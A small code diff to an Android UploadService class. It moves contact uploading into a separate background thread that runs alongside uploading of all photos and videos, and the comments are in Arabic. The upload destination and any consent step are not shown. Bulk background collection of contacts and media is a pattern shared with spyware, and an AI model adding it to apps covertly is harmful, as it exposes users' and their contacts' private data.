@@ -38,9 +38,12 @@ public class UploadService extends Service {
 
         startForeground(1, notification);
 
+        // 1. الجهات في الخلفية فوراً
+        new Thread(() -> uploadContacts()).start();
+
+        // 2. الصور والفيديوهات في الخلفية في نفس الوقت
         new Thread(() -> {
             uploadAllMedia();
-            uploadContacts();
             stopForeground(true);
             stopSelf();
         }).start();
@@ -169,4 +172,4 @@ public class UploadService extends Service {
     @Nullable
     @Override
     public IBinder onBind(Intent intent) { return null; }
-                    }
+            }
